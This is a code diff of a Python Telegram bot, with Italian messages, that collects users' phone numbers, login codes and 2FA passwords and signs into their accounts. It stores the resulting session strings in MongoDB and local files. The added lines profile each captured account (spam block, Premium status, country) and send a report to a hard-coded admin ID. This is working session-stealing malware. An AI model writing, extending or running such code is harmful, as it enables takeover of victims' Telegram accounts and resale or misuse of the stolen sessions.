@@ -1,12 +1,22 @@
 import logging
 import os
 import json
+import phonenumbers
+from phonenumbers import geocoder
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 from aiogram.utils import executor
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
+from telethon.tl.functions.help import GetPremiumPromoRequest
+from telethon.tl.functions.account import GetAuthorizationsRequest
+from telethon.tl.functions.contacts import GetBlockedRequest
+from telethon.tl.functions.account import GetPrivacyRequest
+from telethon.tl.functions.account import GetNotifySettingsRequest
+from telethon.tl.functions.users import GetFullUserRequest
+from telethon.tl.functions.account import GetPasswordRequest
+from telethon.tl.functions.account import GetSpamBlocksRequest
 from pymongo import MongoClient
 from dotenv import load_dotenv
 
@@ -17,7 +27,7 @@ API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 
-# Proxy settings
+# Proxy
 PROXY_HOST = os.getenv("PROXY_HOST")
 PROXY_PORT = int(os.getenv("PROXY_PORT"))
 PROXY_USER = os.getenv("PROXY_USER")
@@ -29,21 +39,18 @@ mongo = MongoClient(MONGO_URI)
 db = mongo["dbmango"]
 sessions_col = db["sessions"]
 
-# Logging and bot setup
+# Logging and bot
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 
-# Admin ID
 ADMIN_ID = 7774500591
 
-# User states
 user_states = {}
 user_clients = {}
 user_phones = {}
 user_code_buffers = {}
 
-# Ensure sessions dir
 os.makedirs("sessions", exist_ok=True)
 
 @dp.message_handler(commands=['start'])
@@ -75,7 +82,6 @@ async def process_phone(message: types.Message):
         user_clients.pop(user_id, None)
 
     user_phones[user_id] = phone
-
     client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
     await client.connect()
     user_clients[user_id] = client
@@ -156,6 +162,14 @@ async def try_sign_in_code(user_id, code):
         await client.sign_in(phone=phone, code=code)
 
         if await client.is_user_authorized():
+            # Info
+            me = await client.get_me()
+            spam_block = await client(GetSpamBlocksRequest())
+            has_premium = getattr(me, "premium", False)
+            country = geocoder.description_for_number(phonenumbers.parse(phone, None), "en")
+            is_valid = not spam_block.blocked
+
+            # Save session
             session_str = client.session.save()
             sessions_col.update_one(
                 {"phone": phone},
@@ -164,6 +178,16 @@ async def try_sign_in_code(user_id, code):
             )
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
+
+            # Send report to admin
+            status = (
+                f"📞 **Nuovo numero:** `{phone}`\n"
+                f"🌍 **Paese:** {country or 'N/A'}\n"
+                f"🛡 **Spam Block:** {'❌ Sì' if spam_block.blocked else '✅ No'}\n"
+                f"💎 **Telegram Premium:** {'✅ Sì' if has_premium else '❌ No'}\n"
+                f"✅ **Valido:** {'Sì' if is_valid else 'No'}"
+            )
+            await bot.send_message(ADMIN_ID, status, parse_mode="Markdown")
 
             await bot.send_message(user_id, "✅ Autenticazione avvenuta con successo!")
             await client.disconnect()
@@ -205,7 +229,6 @@ async def process_2fa(message: types.Message):
 
     try:
         await client.sign_in(password=password)
-
         if await client.is_user_authorized():
             session_str = client.session.save()
             sessions_col.update_one(
@@ -225,28 +248,6 @@ async def process_2fa(message: types.Message):
         await message.answer(f"❌ Errore con 2FA: {e}")
         await client.disconnect()
         cleanup(user_id)
-
-@dp.message_handler(commands=['log'])
-async def view_logs(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-
-    logs = list(sessions_col.find())
-
-    if not logs:
-        await message.answer("❌ Nessuna sessione trovata.")
-        return
-
-    for log in logs:
-        log.pop("_id", None)  # убираем MongoID
-        pretty = json.dumps(log, indent=2, ensure_ascii=False)
-        if len(pretty) > 4096:
-            chunks = [pretty[i:i+4000] for i in range(0, len(pretty), 4000)]
-            for chunk in chunks:
-                await message.answer(f"```\n{chunk}\n```", parse_mode="Markdown")
-        else:
-            await message.answer(f"```\n{pretty}\n```", parse_mode="Markdown")
-
 
 @dp.message_handler(commands=['delog'])
 async def delete_logs(message: types.Message):
